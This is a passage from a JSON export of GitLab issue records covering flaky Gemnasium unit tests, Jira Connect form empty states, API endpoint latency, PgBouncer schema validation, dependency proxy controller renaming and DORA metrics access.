roadmap.","state":"active","created_at":"2020-03-26T20:39:10.889Z","updated_at":"2020-03-26T20:39:10.889Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/48"},"assignees":[],"author":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"type":"ISSUE","assignee":null,"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337280","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337280","notes":"https://gitlab.com/api/v4/projects/278964/issues/337280/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337280/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337280","relative":"#337280","full":"gitlab-org/gitlab#337280"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6004,"epic":{"id":270610,"iid":6004,"title":"Improve the reliability of webhooks","url":"/groups/gitlab-org/-/epics/6004","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":null,"health_status":null},{"id":91127533,"iid":337278,"project_id":278964,"title":"Flaky unit test on Gemnasium TestGraph/PathTo/3rd_level (broken master)","description":"Failing job\n* https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/jobs/1464122967\n\nError:\n\n```\n=== RUN   TestGraph/PathTo/3rd_level\n    graph_test.go:98: \n        \tError Trace:\tgraph_test.go:98\n        \tError:      \t[][]convert.Node{[]convert.Node{convert.Node{IID:0x1, Package:(*parser.Package)(0xc00016cc40)}, convert.Node{IID:0x3, Package:(*parser.Package)(0xc00016cc60)}}, []convert.Node{convert.Node{IID:0x5, Package:(*parser.Package)(0xc00016cca0)}, convert.Node{IID:0x6, Package:(*parser.Package)(0xc00016ccc0)}}} does not contain []convert.Node{convert.Node{IID:0x6, Package:(*parser.Package)(0xc00016c3a0)}, convert.Node{IID:0x7, Package:(*parser.Package)(0xc00016c3e0)}}\n        \tTest:       \tTestGraph/PathTo/3rd_level\n--- FAIL: TestGraph (0.00s)\n    --- FAIL: TestGraph/PathTo (0.00s)\n        --- PASS: TestGraph/PathTo/direct (0.00s)\n        --- PASS: TestGraph/PathTo/direct_2 (0.00s)\n        --- PASS: TestGraph/PathTo/2nd_level (0.00s)\n        --- FAIL: TestGraph/PathTo/3rd_level (0.00s)\n```\n\nThis is also reproducible locally:\n\n```sh\n$ git clone https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium.git\n$ cd gemnasium\n$ docker run -it --rm -v \"$PWD:/src\" golang:1.15 /bin/bash\n\nroot@16372935bab7:/go# cd /src/convert\nroot@16372935bab7:/src/convert# for i in `seq 1 10`; do go test -run TestGraph/PathTo/3rd_level; done\nPASS\nok  \tgitlab.com/gitlab-org/security-products/analyzers/gemnasium/v2/convert\t0.005s\nPASS\nok  \tgitlab.com/gitlab-org/security-products/analyzers/gemnasium/v2/convert\t0.004s\nPASS\nok  \tgitlab.com/gitlab-org/security-products/analyzers/gemnasium/v2/convert\t0.004s\nPASS\nok  \tgitlab.com/gitlab-org/security-products/analyzers/gemnasium/v2/convert\t0.004s\nPASS\nok  \tgitlab.com/gitlab-org/security-products/analyzers/gemnasium/v2/convert\t0.005s\nPASS\nok  \tgitlab.com/gitlab-org/security-products/analyzers/gemnasium/v2/convert\t0.005s\n--- FAIL: TestGraph (0.00s)\n    --- FAIL: TestGraph/PathTo (0.00s)\n        --- FAIL: TestGraph/PathTo/3rd_level (0.00s)\n            graph_test.go:98:\n                \tError Trace:\tgraph_test.go:98\n                \tError:      \t[][]convert.Node{\n                                          []convert.Node{\n                                            convert.Node{\n                                              IID:0x1,\n                                              Package:(*parser.Package)(0xc00000f540)\n                                            },\n                                            convert.Node{\n                                              IID:0x3,\n                                              Package:(*parser.Package)(0xc00000f560)\n                                            }\n                                          },\n                                          []convert.Node{\n                                            convert.Node{\n                                              IID:0x5,\n                                              Package:(*parser.Package)(0xc00000f5a0)\n                                            },\n                                            convert.Node{\n                                              IID:0x6,\n                                              Package:(*parser.Package)(0xc00000f5c0)\n                                            }\n                                          }\n                                        }\n\n                                        does not contain\n\n                                        []convert.Node{\n                                          convert.Node{\n                                            IID:0x6,\n                                            Package:(*parser.Package)(0xc00000eca0)\n                                          },\n                                          convert.Node{\n                                            IID:0x7,\n                                            Package:(*parser.Package)(0xc00000ece0)\n                                          }\n                                        }\n\n                \tTest:       \tTestGraph/PathTo/3rd_level\nFAIL\nexit status 1\nFAIL\tgitlab.com/gitlab-org/security-products/analyzers/gemnasium/v2/convert\t0.006s\nPASS\nok  \tgitlab.com/gitlab-org/security-products/analyzers/gemnasium/v2/convert\t0.005s\nPASS\nok  \tgitlab.com/gitlab-org/security-products/analyzers/gemnasium/v2/convert\t0.005s\nPASS\nok  \tgitlab.com/gitlab-org/security-products/analyzers/gemnasium/v2/convert\t0.005s\n```\n\n\n### Possible fix","state":"closed","created_at":"2021-07-30T03:02:42.338Z","updated_at":"2021-08-10T02:32:55.738Z","closed_at":"2021-07-30T06:52:40.558Z","closed_by":{"id":1958785,"username":"fcatteau","name":"Fabien Catteau","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1958785/avatar.png","web_url":"https://gitlab.com/fcatteau"},"labels":["Category:Dependency Scanning","Enterprise Edition","GitLab Ultimate","backend","bug::availability","devops::secure","group::composition analysis","priority::1","section::sec","severity::2","type::bug","workflow::production"],"milestone":{"id":1850126,"iid":62,"group_id":9970,"title":"14.2","description":"","state":"active","created_at":"2021-01-26T16:57:35.404Z","updated_at":"2021-07-22T19:45:42.498Z","due_date":"2021-08-17","start_date":"2021-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/62"},"assignees":[{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"}],"author":{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"},"type":"ISSUE","assignee":{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337278","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337278","notes":"https://gitlab.com/api/v4/projects/278964/issues/337278/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337278/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337278","relative":"#337278","full":"gitlab-org/gitlab#337278"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91127148,"iid":337276,"project_id":278964,"title":"Flaky unit test on finder module (broken master)","description":"Failing job\n* https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/jobs/1443391286\n\nError:\n\n```\n--- FAIL: TestFinder (0.01s)\n    --- FAIL: TestFinder/FindProjects (0.01s)\n        --- PASS: TestFinder/FindProjects/empty (0.00s)\n        --- PASS: TestFinder/FindProjects/gemnasium (0.00s)\n        --- PASS: TestFinder/FindProjects/gemnasium/max-depth/2 (0.00s)\n        --- PASS: TestFinder/FindProjects/gemnasium/max-depth/1 (0.00s)\n        --- PASS: TestFinder/FindProjects/gemnasium/max-depth/0 (0.00s)\n        --- PASS: TestFinder/FindProjects/gemnasium/ignored-dirs (0.00s)\n        --- FAIL: TestFinder/FindProjects/maven (0.00s)\n        --- FAIL: TestFinder/FindProjects/maven#01 (0.00s)\n        --- FAIL: TestFinder/FindProjects/maven#02 (0.00s)\n        --- PASS: TestFinder/FindProjects/gemnasium-python (0.00s)\n        --- PASS: TestFinder/FindProjects/gemnasium-python/pip-requirements-file (0.00s)\n```\n\n\n### Possible fix","state":"closed","created_at":"2021-07-30T02:40:19.003Z","updated_at":"2021-08-10T02:32:52.113Z","closed_at":"2021-08-04T10:24:45.607Z","closed_by":{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"},"labels":["Category:Dependency Scanning","Enterprise Edition","GitLab Ultimate","backend","bug::availability","devops::secure","group::composition analysis","priority::1","section::sec","severity::2","type::bug","workflow::production"],"milestone":{"id":1850126,"iid":62,"group_id":9970,"title":"14.2","description":"","state":"active","created_at":"2021-01-26T16:57:35.404Z","updated_at":"2021-07-22T19:45:42.498Z","due_date":"2021-08-17","start_date":"2021-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/62"},"assignees":[{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"}],"author":{"id":52092,"username":"gonzoyumo","name":"Olivier Gonzalez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/651e0ff81c3995a05269f7c80895fe89?s=80\u0026d=identicon","web_url":"https://gitlab.com/gonzoyumo"},"type":"ISSUE","assignee":{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337276","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337276","notes":"https://gitlab.com/api/v4/projects/278964/issues/337276/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337276/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337276","relative":"#337276","full":"gitlab-org/gitlab#337276"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91126727,"iid":337274,"project_id":278964,"title":"Jira Connect New Branch form: Provide better empty state for project and source branch dropdowns","description":"We should provide a better empty state for the Project Select and Source Branch Select dropdowns on the Jira Connect **New Branch** page.\n\nOriginal feature issue is: https://gitlab.com/gitlab-org/gitlab/-/issues/2647\n\nThis was identified in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/66032#note_639227366.\n\nPage: http://gdk.test:3000/-/jira_connect/branches/new\n\n### Proposal\n\nGo with [Option B](https://gitlab.com/gitlab-org/gitlab/-/issues/337274/designs/Selection-Dependent_Inputs.png) which hides form elements instead of disabling them. See comments in design for more information.\n\n\n### Availability \u0026 Testing\n\nSuggestion would be to add frontend unit test examples that check for existence/visibility of dependent fields.\n| project |  source branch | branch name | create branch button |\n| ---     | ---- | --- | --- |\n| empty |  hidden | hidden | disabled |\n| set   | empty | hidden | disabled |\n| set | set | empty | disabled |\n| set | set | set | enabled |","state":"closed","created_at":"2021-07-30T02:13:12.131Z","updated_at":"2022-11-22T19:36:42.778Z","closed_at":"2022-02-11T04:27:06.705Z","closed_by":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"labels":["Deliverable","Integration::Jira","Jira::ConnectApp","auto updated","devops::manage","feature::enhancement","frontend","group::integrations","quad-planning::complete-action","section::dev","type::feature","workflow::canary"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"}],"author":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"type":"ISSUE","assignee":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"user_notes_count":16,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337274","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337274","notes":"https://gitlab.com/api/v4/projects/278964/issues/337274/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337274/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337274","relative":"#337274","full":"gitlab-org/gitlab#337274"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91123614,"iid":337269,"project_id":278964,"title":"Improve latency of /api/:version/repos/:namespace/:project/pulls","description":"The [latency \u003e1s count](https://log.gprd.gitlab.net/app/visualize#/create?type=table\u0026indexPattern=7092c4e2-4eb5-46f2-8305-a7da2edad090\u0026_a=(filters:!(('$state':(store:appState),meta:(alias:!n,disabled:!f,index:'7092c4e2-4eb5-46f2-8305-a7da2edad090',key:json.meta.feature_category,negate:!f,params:(query:integrations),type:phrase),query:(match_phrase:(json.meta.feature_category:integrations)))),linked:!f,query:(language:kuery,query:''),uiState:(),vis:(aggs:!((enabled:!t,id:'1',params:(),schema:metric,type:count),(enabled:!t,id:'4',params:(field:json.meta.caller_id.keyword,missingBucket:!f,missingBucketLabel:Missing,order:desc,orderBy:'3',otherBucket:!t,otherBucketLabel:Other,size:5),schema:bucket,type:terms),(enabled:!t,id:'3',params:(customLabel:'Operations%20over%20threshold',field:json.duration_s,json:'%7B%22script%22:%20%22doc%5B!'json.duration_s!'%5D.value%20%3E%3D%201%20%3F%201%20:%200%22%7D'),schema:metric,type:sum)),params:(autoFitRowToContent:!f,perPage:10,percentageCol:'',showMetricsAtAllLevels:!f,showPartialRows:!f,showToolbar:!f,showTotal:!f,totalFunc:sum),title:'',type:table))\u0026_g=(filters:!(),refreshInterval:(pause:!t,value:0),time:(from:now-24h%2Fh,to:now))) of `/api/:version/repos/:namespace/:project/pulls` is currently the second highest in that table, and is likely to be contributing to the ~\"group::ecosystem\" error budget cost.\n\nWe should try to improve the latency of this endpoint.\n\nThe endpoint has been given a temporary custom Apdex SLO of `urgency: :low` (5 seconds, rather than the normal 1s threshold) in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/78142 until we have optimised this endpoint. Part of this issue is to remove the custom Apdex SLO for the endpoint when we have verified that performance has been improved.\n\n### Testing \u0026 Availability\n\nSuggestion: Add a new scenario in the [GitLab Performance Tool](https://gitlab.com/gitlab-org/quality/performance) to cover this endpoint.","state":"closed","created_at":"2021-07-29T23:54:53.398Z","updated_at":"2022-11-22T19:36:44.160Z","closed_at":"2022-05-04T21:22:03.154Z","closed_by":{"id":10222550,"username":"g.hickman","name":"Grant Hickman","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10222550/avatar.png","web_url":"https://gitlab.com/g.hickman"},"labels":["[deprecated] Accepting merge requests","backend","bug::performance","devops::manage","group::integrations","quad-planning::complete-action","reliability","section::dev","type::maintenance","won't do","workflow::ready for development"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"type":"ISSUE","assignee":null,"user_notes_count":18,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337269","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337269","notes":"https://gitlab.com/api/v4/projects/278964/issues/337269/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337269/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337269","relative":"#337269","full":"gitlab-org/gitlab#337269"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7508,"epic":{"id":436596,"iid":7508,"title":"Strategy for GitHub enterprise DVCS","url":"/groups/gitlab-org/-/epics/7508","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":91123391,"iid":337268,"project_id":278964,"title":"Improve latency of api/:version/repos/:namespace/:project/branches","description":"The [latency \u003e1s count](https://log.gprd.gitlab.net/app/kibana#/visualize/create?type=table\u0026indexPattern=7092c4e2-4eb5-46f2-8305-a7da2edad090\u0026_a=(filters:!((query:(bool:(minimum_should_match:1,should:!((match_phrase:(json.meta.feature_category:integrations))))))),query:(language:kuery,query:''),vis:(aggs:!((enabled:!t,id:'1',params:(),schema:metric,type:count),(enabled:!t,params:(field:json.meta.caller_id.keyword,missingBucket:!f,missingBucketLabel:Missing,order:desc,orderBy:'3',otherBucket:!t,otherBucketLabel:Other,size:5),schema:bucket,type:terms),(enabled:!t,id:'3',params:(customLabel:'Operations+over+threshold',field:json.duration_s,json:'%7B%22script%22:+%22doc%5B!'json.duration_s!'%5D.value+%3E=+1+?+1+:+0%22%7D'),schema:metric,type:sum))))\u0026_g=(time:(from:'now-7d',to:'now'))) of `api/:version/repos/:namespace/:project/branches` is currently the highest in that table, and is likely to be contributing to the ~\"group::ecosystem\" error budget cost.\n\nWe should try to improve the latency of this endpoint.\n\nNote, the latency issue _could possibly_ relate to https://gitlab.com/gitlab-org/gitlab/-/issues/331329, but more likely doesn't.\n\nThe endpoint has been given a temporary custom Apdex SLO of `urgency: :low` (5 seconds, rather than the normal 1s threshold) in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/78142 until we have optimised this endpoint. Part of this issue is to remove the custom Apdex SLO for the endpoint when we have verified that performance has been improved.\n\n### Testing \u0026 Availability\n\nSuggestion: Consider adding a new scenario in the [GitLab Performance Tool](https://gitlab.com/gitlab-org/quality/performance) to cover this endpoint.","state":"closed","created_at":"2021-07-29T23:52:20.672Z","updated_at":"2022-11-22T19:36:44.936Z","closed_at":"2022-05-04T21:22:19.521Z","closed_by":{"id":10222550,"username":"g.hickman","name":"Grant Hickman","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10222550/avatar.png","web_url":"https://gitlab.com/g.hickman"},"labels":["[deprecated] Accepting merge requests","backend","bug::performance","devops::manage","group::integrations","quad-planning::complete-action","reliability","section::dev","type::maintenance","won't do","workflow::ready for development"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"type":"ISSUE","assignee":null,"user_notes_count":19,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337268","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337268","notes":"https://gitlab.com/api/v4/projects/278964/issues/337268/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337268/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337268","relative":"#337268","full":"gitlab-org/gitlab#337268"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7508,"epic":{"id":436596,"iid":7508,"title":"Strategy for GitHub enterprise DVCS","url":"/groups/gitlab-org/-/epics/7508","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":91120644,"iid":337266,"project_id":278964,"title":"Validate production with PgBouncer can read/write table in new schema","description":"In https://gitlab.com/groups/gitlab-org/-/epics/6451, we propose to use database schemas. Particularly we will :\n\n1. create new `gitlab_ci` schema.\n1. Move CI related tables to `gitlab_ci` schema.\n1. Not set `production.schema_search_path` in `config/database.yml`\n\nThis issue is about validating that we can set up search path for the pgBouncer role / connection and we can access a table that has been moved to the `gitlab_ci` schema.\n\nWe have two options:\n\n1. Find a low/non-impactful table to move to `gitlab_ci` schema.\n1. Make a test table/model and use that new model in a test page.\n\n## Why ?\n\n- Consistency of development to production\n- No need to constantly switch between schema, and schema-less\n\n### Why not ?\n\n- We still have not solved how self-managed will migrate to DB schemas","state":"closed","created_at":"2021-07-29T21:38:56.401Z","updated_at":"2022-05-31T12:22:05.910Z","closed_at":"2021-08-16T08:56:45.553Z","closed_by":{"id":2535118,"username":"tkuah","name":"Thong Kuah","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f7b51bdd49a4914d29504d7ff4c3f7b9?s=80\u0026d=identicon","web_url":"https://gitlab.com/tkuah"},"labels":["Category:Pods","auto updated","devops::data_stores","group::pods","section::enablement","type::feature"],"milestone":{"id":1850126,"iid":62,"group_id":9970,"title":"14.2","description":"","state":"active","created_at":"2021-01-26T16:57:35.404Z","updated_at":"2021-07-22T19:45:42.498Z","due_date":"2021-08-17","start_date":"2021-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/62"},"assignees":[{"id":2535118,"username":"tkuah","name":"Thong Kuah","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f7b51bdd49a4914d29504d7ff4c3f7b9?s=80\u0026d=identicon","web_url":"https://gitlab.com/tkuah"}],"author":{"id":2535118,"username":"tkuah","name":"Thong Kuah","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f7b51bdd49a4914d29504d7ff4c3f7b9?s=80\u0026d=identicon","web_url":"https://gitlab.com/tkuah"},"type":"ISSUE","assignee":{"id":2535118,"username":"tkuah","name":"Thong Kuah","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f7b51bdd49a4914d29504d7ff4c3f7b9?s=80\u0026d=identicon","web_url":"https://gitlab.com/tkuah"},"user_notes_count":10,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337266","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337266","notes":"https://gitlab.com/api/v4/projects/278964/issues/337266/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337266/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337266","relative":"#337266","full":"gitlab-org/gitlab#337266"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6451,"epic":{"id":314946,"iid":6451,"title":"Use database SCHEMAs to better isolated CI decomposed features","url":"/groups/gitlab-org/-/epics/6451","group_id":9970,"human_readable_timestamp":"\u003cstrong\u003e546\u003c/strong\u003e days elapsed"},"iteration":null,"health_status":null},{"id":91119378,"iid":337264,"project_id":278964,"title":"Update dependency proxy controllers namespace","description":"## Proposal\n\nIn https://gitlab.com/gitlab-org/gitlab/-/merge_requests/64363 we refactored to include `Groups::DependencyProxy::ApplicationController`. The other dependency proxy controllers could benefit from common namespacing and possibly being renamed:\n\nCurrent name | Proposed name\n---------- | -------\n`Groups::DependencyProxyAuthController` | `Groups::DependencyProxy::AuthController`\n`Groups::DependencyProxyForContainersController` | `Groups::DependencyProxy::ApiController` or `Groups::DependencyProxy::ImageController` ?\n\nThis issue originates from [this comment](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/64363#note_639121385)","state":"closed","created_at":"2021-07-29T21:23:50.415Z","updated_at":"2021-10-28T13:54:29.237Z","closed_at":"2021-08-11T13:47:45.464Z","closed_by":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"labels":["Category:Dependency Proxy","auto updated","backend","devops::package","group::package registry","maintenance::refactor","ruby","section::ops","type::maintenance"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"}],"author":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"type":"ISSUE","assignee":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337264","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337264","notes":"https://gitlab.com/api/v4/projects/278964/issues/337264/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337264/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":"https://gitlab.com/api/v4/projects/278964/issues/337535"},"references":{"short":"#337264","relative":"#337264","full":"gitlab-org/gitlab#337264"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91110970,"iid":337256,"project_id":278964,"title":"Show DORA API-based Deployment Frequency metric for Premium customers","description":"### Overview\n\nIn 13.12, the Deployment Frequency metric in group-level VSA switched over to using the DORA4 API so that users will see the exact same deployment frequency metric regardless of whether they are getting that data from the API, CI/CD Analytics, or VSA. This change caused confusion for a number of reasons. \n\n1. The DORA4 API is restricted to Ultimate customers. Premium customers had access to the deployment frequency metric in group-level API prior to this change but now they do not. To further confuse things, they are still able to see a deployment frequency metric in project-level VSA.\n1. In project-level VSA, the deployment metric does not use the DORA4 API. It is showing the deployment frequency for 